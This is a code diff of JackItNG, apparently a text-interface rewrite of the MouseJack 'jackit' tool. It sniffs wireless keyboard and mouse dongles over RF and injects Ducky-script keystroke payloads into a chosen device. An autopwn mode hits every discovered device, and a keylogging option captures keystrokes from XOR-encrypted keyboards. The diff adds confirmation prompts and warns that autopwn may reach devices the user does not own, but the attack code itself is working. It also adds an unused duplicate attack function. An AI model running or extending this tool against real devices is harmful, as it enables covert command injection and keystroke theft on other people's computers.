@@ -1,6 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+# ======================================================================
+#
+# JackItNG - Textual TUI for Logitech Unifying research
+# Modernized evolution of insecurityofthings/jackit
+#
+# Provides:
+#   - RF scanning with configurable duration/interval
+#   - Payload browser & viewer
+#   - Attack selected device
+#   - Autopwn mode
+#   - Live activity table
+#
+# Requires CrazyRadio PA with MouseJack firmware
+#
+# ======================================================================
+
 import os
 import sys
 import time
@@ -10,8 +26,8 @@ from typing import Optional
 import click
 
 from textual.app import App, ComposeResult
-from textual.widgets import Header, Footer, DataTable, Static, DirectoryTree
-from textual.containers import Container, VerticalScroll
+from textual.widgets import Header, Footer, DataTable, Static, DirectoryTree, Button
+from textual.containers import Container, VerticalScroll, Horizontal
 from textual.screen import ModalScreen
 from textual.reactive import reactive
 
@@ -30,10 +46,151 @@ def confirm_root():
 
 
 # ==========================================================
+# Confirmation Dialog
+# ==========================================================
+
+class ConfirmDialog(ModalScreen[bool]):
+
+    CSS = """
+    Screen {
+        align: center middle;
+    }
+
+    #dialog {
+        width: 60%;
+        background: $surface;
+        border: solid $accent;
+        padding: 1 2;
+    }
+
+    #dialog-header {
+        padding-left: 1;
+        text-style: bold;
+    }
+
+    #dialog-header.danger {
+        background: red;
+        color: white;
+    }
+
+    #dialog-header.normal {
+        background: $accent;
+        color: $text;
+    }
+
+    #buttons {
+        width: 100%;
+        height: auto;
+        align: center middle;
+        padding-top: 1;
+    }
+
+    Button {
+        margin: 0 3;
+    }
+    """
+
+
+    BINDINGS = [
+        ("enter", "confirm", "Confirm"),
+        ("y", "confirm", "Confirm"),
+        ("n", "cancel", "Cancel"),
+        ("escape", "cancel", "Cancel"),
+        ("tab", "next_button", "Next"),
+        ("left", "prev_button", "Prev"),
+        ("right", "next_button", "Next"),
+    ]
+
+    def __init__(self, title: str, message: str, danger: bool = False):
+        super().__init__()
+        self.title = title
+        self.message = message
+        self.danger = danger
+
+
+    def compose(self) -> ComposeResult:
+
+        header_classes = "danger" if self.danger else "normal"
+
+        yield Container(
+            Static(self.title, id="dialog-header", classes=header_classes),
+            Static(self.message),
+            Horizontal(
+                Button("Continue", id="confirm"),
+                Button("Cancel", id="cancel"),
+                id="buttons",
+            ),
+            id="dialog",
+        )
+
+
+    # --------------------------------------------------
+    # When dialog mounts → focus Continue by default
+    # --------------------------------------------------
+
+    async def on_mount(self):
+        confirm_button = self.query_one("#confirm", Button)
+        confirm_button.focus()
+
+    # --------------------------------------------------
+    # Button Click
+    # --------------------------------------------------
+
+    async def on_button_pressed(self, event: Button.Pressed):
+        if event.button.id == "confirm":
+            self.dismiss(True)
+        else:
+            self.dismiss(False)
+
+    # --------------------------------------------------
+    # Keyboard Actions
+    # --------------------------------------------------
+
+    def action_confirm(self):
+        self.dismiss(True)
+
+    def action_cancel(self):
+        self.dismiss(False)
+
+    def action_next_button(self):
+        self._cycle_focus(forward=True)
+
+    def action_prev_button(self):
+        self._cycle_focus(forward=False)
+
+    # --------------------------------------------------
+    # Focus Cycling Logic
+    # --------------------------------------------------
+
+    def _cycle_focus(self, forward: bool):
+        buttons = self.query(Button)
+        buttons = list(buttons)
+
+        if not buttons:
+            return
+
+        focused = self.focused
+
+        if focused not in buttons:
+            buttons[0].focus()
+            return
+
+        index = buttons.index(focused)
+
+        if forward:
+            index = (index + 1) % len(buttons)
+        else:
+            index = (index - 1) % len(buttons)
+
+        buttons[index].focus()
+
+
+# ==========================================================
 # File Viewer
 # ==========================================================
 
 class FileViewer(ModalScreen[None]):
+
     CSS = """
         #viewer-header {
             height: 1;
@@ -42,15 +199,7 @@ class FileViewer(ModalScreen[None]):
             padding-left: 1;
             text-style: bold;
         }
-        DataTable {
-            width: 95%;
-        }
-
-        #device-summary {
-            width: 95%;
-        }
-
-        """
+    """
 
     def __init__(self, path: str):
         super().__init__()
@@ -58,13 +207,8 @@ class FileViewer(ModalScreen[None]):
 
     def compose(self) -> ComposeResult:
         yield Container(
-            Static(
-                f"Viewing: {self.path} (ESC to close)",
-                id="viewer-header"
-            ),
-            VerticalScroll(
-                Static(self.read_file())
-            ),
+            Static(f"Viewing: {self.path} (ESC to close)", id="viewer-header"),
+            VerticalScroll(Static(self.read_file())),
         )
 
     def read_file(self) -> str:
@@ -95,9 +239,7 @@ class PayloadBrowser(ModalScreen[Optional[str]]):
             DirectoryTree(self.start_path),
         )
 
-    async def on_directory_tree_file_selected(
-        self, event: DirectoryTree.FileSelected
-    ):
+    async def on_directory_tree_file_selected(self, event: DirectoryTree.FileSelected):
         self.dismiss(event.path)
 
     async def on_key(self, event):
@@ -107,7 +249,6 @@ class PayloadBrowser(ModalScreen[Optional[str]]):
         elif event.key == "v":
             tree = self.query_one(DirectoryTree)
             node = tree.cursor_node
-
             if node and node.data:
                 path = node.data.path
                 if path and path.is_file():
@@ -168,10 +309,6 @@ class JackItApp(App):
         self.attack = None
         self.scan_task: Optional[asyncio.Task] = None
         self.next_scan_time: Optional[float] = None
-        self.target_address = address
-        self.target_vendor = vendor
-        self.auto_start_autopwn = autopwn
-        self.all_channels = all_channels
         self.payload_path: Optional[str] = None
 
         try:
@@ -181,56 +318,8 @@ class JackItApp(App):
             sys.exit(1)
 
     # ------------------------------------------------------
-    async def action_attack_selected(self):
-        if not self.attack:
-            self.update_status("No payload loaded")
-            return
-
-        table = self.query_one(DataTable)
-
-        if table.cursor_row is None:
-            self.update_status("No device selected")
-            return
-
-        row_index = table.cursor_row
-
-        devices = list(self.jack.devices.items())
-
-        if row_index >= len(devices):
-            self.update_status("Invalid selection")
-            return
-
-        addr, device = devices[row_index]
-
-        hid = device.get("device")
-        if not hid:
-            self.update_status("Device not injectable")
-            return
-
-        payload = device["payload"]
-        channels = device["channels"]
-        address = device["address"]
-
-        self.jack.sniffer_mode(address)
-        lock_channel = self.jack.find_channel(address)
-
-        if lock_channel:
-            self.jack.attack(hid(address, payload), self.attack)
-            self.update_status(f"Attacked {addr}")
-        else:
-            for ch in channels:
-                self.jack.set_channel(ch)
-                self.jack.attack(hid(address, payload), self.attack)
-
-            self.update_status(f"Attacked {addr} (all channels)")
-
-
-    async def action_view_payload(self):
-        if not self.payload_path:
-            self.update_status("No payload loaded")
-            return
-
-        await self.push_screen(FileViewer(self.payload_path))
+    # UI Compose
+    # ------------------------------------------------------
 
     def compose(self) -> ComposeResult:
         yield Header()
@@ -254,28 +343,21 @@ class JackItApp(App):
         col_count.justify = "right"
 
         self.set_interval(1.0, self.update_countdown)
-        if self.attack:
-            self.update_status("Payload loaded")
 
         width = self.size.width
         fancy_line = "─" * (width - 1)
-
         summary = self.query_one("#device-summary", Static)
         summary.update(f"{fancy_line}\nDevices found: 0")
-
-
 
     # ------------------------------------------------------
     # Countdown
     # ------------------------------------------------------
+
     async def update_countdown(self):
         if not self.scanning or not self.next_scan_time:
             return
 
-        remaining = self.next_scan_time - time.time()
-        if remaining < 0:
-            remaining = 0
-
+        remaining = max(0, self.next_scan_time - time.time())
         status = self.query_one("#status", Static)
 
         status.update(
@@ -286,20 +368,15 @@ class JackItApp(App):
         )
 
     # ------------------------------------------------------
-    # Scanning
+    # Scan Loop
     # ------------------------------------------------------
 
     async def scan_loop(self):
         while self.scanning:
-
             cycle_start = time.time()
-
-            # Immediate RF scan
             await asyncio.to_thread(self.jack.scan, self.duration)
-
             self.refresh_table()
 
-            # Schedule next scan time
             elapsed = time.time() - cycle_start
             remaining = self.interval - elapsed
 
@@ -312,18 +389,12 @@ class JackItApp(App):
             else:
                 self.next_scan_time = None
 
-
     def refresh_table(self):
         table = self.query_one(DataTable)
         summary = self.query_one("#device-summary", Static)
 
         table.clear()
-
         now = time.time()
-
-        total_width = self.size.width
-        fixed_width = 4 + 18 + 9 + 7 + 13 + 14 + 7
-        available_packet_width = max(10, total_width - fixed_width)
 
         for idx, (addr, device) in enumerate(self.jack.devices.items(), start=1):
 
@@ -342,9 +413,6 @@ class JackItApp(App):
 
             packet = str(device.get("payload", ""))
 
-            if len(packet) > available_packet_width:
-                packet = packet[: available_packet_width - 1] + "…"
-
             table.add_row(
                 str(idx),
                 addr,
@@ -355,43 +423,27 @@ class JackItApp(App):
                 packet,
             )
 
-            width = self.size.width
-
-            fancy_line = "─" * (width - 1)
-
-            summary.update(
-                f"{fancy_line}\nDevices found: {len(self.jack.devices)}"
-            )
-
+        width = self.size.width
+        fancy_line = "─" * (width - 1)
+        summary.update(f"{fancy_line}\nDevices found: {len(self.jack.devices)}")
 
     async def action_toggle_scan(self):
         self.scanning = not self.scanning
 
         if self.scanning:
-            # Immediately update header
-            self.update_status("SCANNING")
-
-            # Start scan loop
+            self.update_status()
             self.scan_task = asyncio.create_task(self.scan_loop())
-
         else:
-            self.next_scan_time = None
-
             if self.scan_task:
                 self.scan_task.cancel()
-                self.scan_task = None
-
-            # Immediately update header
-            self.update_status("Idle")
+            self.update_status()
 
     # ------------------------------------------------------
     # Payload
     # ------------------------------------------------------
 
     async def action_select_payload(self):
-        await self.push_screen(
-            PayloadBrowser("."), self.on_payload_selected
-        )
+        await self.push_screen(PayloadBrowser("."), self.on_payload_selected)
 
     async def on_payload_selected(self, path: Optional[str]):
         if path:
@@ -400,28 +452,142 @@ class JackItApp(App):
     def load_payload(self, path, update_ui=True):
         try:
             with open(path, "r") as f:
-                parser = duckyparser.DuckyParser(
-                    f.read(), layout=self.layout
-                )
+                parser = duckyparser.DuckyParser(f.read(), layout=self.layout)
                 self.attack = parser.parse()
                 self.payload_name = os.path.basename(path)
                 self.payload_path = path
-
                 if update_ui:
-                    self.update_status("Payload loaded")
-
+                    self.update_status()
         except Exception:
             if update_ui:
-                self.update_status("Payload load failed")
+                self.update_status()
+
+    async def action_view_payload(self):
+        if not self.payload_path:
+            self.update_status()
+            return
+        await self.push_screen(FileViewer(self.payload_path))
+
+    # ------------------------------------------------------
+    # Attack (with Confirmation)
+    # ------------------------------------------------------
+
+    async def action_attack_selected(self):
+
+        if not self.attack:
+            self.update_status()
+            return
+
+        table = self.query_one(DataTable)
+
+        if table.cursor_row is None:
+            self.update_status()
+            return
+
+        devices = list(self.jack.devices.items())
+        row_index = table.cursor_row
+
+        if row_index >= len(devices):
+            return
+
+        addr, _ = devices[row_index]
+
+        dialog = ConfirmDialog(
+            "Confirm Attack",
+            f"\nAttack selected device?\n\nAddress: {addr}\nPayload: {self.payload_name}",
+        )
+
+        await self.push_screen(dialog, self._on_attack_selected_confirmed)
+
+    async def _on_attack_selected_confirmed(self, confirmed: bool):
+
+        if not confirmed:
+            return
+
+        table = self.query_one(DataTable)
+        devices = list(self.jack.devices.items())
+        row_index = table.cursor_row
+
+        if row_index is None or row_index >= len(devices):
+            return
+
+        addr, device = devices[row_index]
+
+        hid = device.get("device")
+        if not hid:
+            return
+
+        payload = device["payload"]
+        channels = device["channels"]
+        address = device["address"]
+
+        self.jack.sniffer_mode(address)
+        lock_channel = self.jack.find_channel(address)
+
+        if lock_channel:
+            self.jack.attack(hid(address, payload), self.attack)
+        else:
+            for ch in channels:
+                self.jack.set_channel(ch)
+                self.jack.attack(hid(address, payload), self.attack)
+
+        self.update_status()
 
 
+    async def _perform_attack_selected(self):
+
+        table = self.query_one(DataTable)
+        devices = list(self.jack.devices.items())
+        row_index = table.cursor_row
+        addr, device = devices[row_index]
+
+        hid = device.get("device")
+        if not hid:
+            return
+
+        payload = device["payload"]
+        channels = device["channels"]
+        address = device["address"]
+
+        self.jack.sniffer_mode(address)
+        lock_channel = self.jack.find_channel(address)
+
+        if lock_channel:
+            self.jack.attack(hid(address, payload), self.attack)
+        else:
+            for ch in channels:
+                self.jack.set_channel(ch)
+                self.jack.attack(hid(address, payload), self.attack)
+
+        self.update_status()
 
     async def action_autopwn(self):
+
         if not self.attack:
-            self.update_status("No payload loaded")
+            self.update_status()
+            return
+
+        dialog = ConfirmDialog(
+            "WARNING: AUTOPWN MODE",
+            (
+                "\n"
+                "Autopwn will attempt to inject the loaded payload\n"
+                "into ALL discovered injectable devices.\n\n"
+                "This may affect devices you do NOT own.\n\n"
+                "Proceed with extreme caution."
+            ),
+            danger=True,
+        )
+
+        await self.push_screen(dialog, self._on_autopwn_confirmed)
+
+    async def _on_autopwn_confirmed(self, confirmed: bool):
+
+        if not confirmed:
             return
 
         for addr, device in self.jack.devices.items():
+
             payload = device["payload"]
             channels = device["channels"]
             address = device["address"]
@@ -440,18 +606,21 @@ class JackItApp(App):
                     self.jack.set_channel(ch)
                     self.jack.attack(hid(address, payload), self.attack)
 
-        self.update_status("Autopwn completed")
+        self.update_status()
 
-    def update_status(self, message=None):
+
+
+    # ------------------------------------------------------
+    # Status
+    # ------------------------------------------------------
+
+    def update_status(self):
         status = self.query_one("#status", Static)
 
         if self.scanning:
             base = f"SCANNING | RF: {self.duration}s | Interval: {self.interval}s"
         else:
             base = f"Idle     | RF: {self.duration}s | Interval: {self.interval}s"
-
-#        if message:
-#            base = f"{base} | {message}"
 
         base += f" | Payload: {self.payload_name}"
 
@@ -463,38 +632,25 @@ class JackItApp(App):
 # ==========================================================
 
 @click.command()
-@click.option("--debug", is_flag=True, help="Enable debug")
-@click.option("--script", type=click.Path(), help="Ducky file to use for injection")
-@click.option("--lowpower", is_flag=True, help="Disable LNA on CrazyPA")
-@click.option("--interval", default=5, type=int, help="Interval of scan in seconds, default to 5s")
-@click.option("--duration", default=5, type=int, help="Duration of scan in seconds, default to 5s")
-@click.option("--layout", default="us", help="Keyboard layout: us, gb, de...")
-@click.option("--address", default="", help="Address of device to target attack")
-@click.option("--vendor", default="", help="Vendor of device to target (required when specifying address)")
-@click.option("--reset", is_flag=True, help="Reset CrazyPA dongle prior to initialization")
-@click.option("--autopwn", is_flag=True, help="Automatically find and attack all targets")
-@click.option("--all-channels", is_flag=True, help="Send attack to all detected channels")
-@click.option("--keylogging", is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
-def cli(
-    debug,
-    script,
-    lowpower,
-    interval,
-    duration,
-    layout,
-    address,
-    vendor,
-    reset,
-    autopwn,
-    all_channels,
-    keylogging,
-):
+@click.option("--debug", is_flag=True)
+@click.option("--script", type=click.Path())
+@click.option("--lowpower", is_flag=True)
+@click.option("--interval", default=5, type=int)
+@click.option("--duration", default=5, type=int)
+@click.option("--layout", default="us")
+@click.option("--address", default="")
+@click.option("--vendor", default="")
+@click.option("--reset", is_flag=True)
+@click.option("--autopwn", is_flag=True)
+@click.option("--all-channels", is_flag=True)
+@click.option("--keylogging", is_flag=True)
+def cli(debug, script, lowpower, interval, duration, layout, address, vendor, reset, autopwn, all_channels, keylogging):
 
     confirm_root()
 
     if keylogging:
         from jackit import keylogger
-        jack = mousejack.MouseJack(lowpower, debug, reset or True)
+        jack = mousejack.MouseJack(lowpower, debug, True)
         k = keylogger.KeyLogger(jack, layout)
         k.scan()
         return
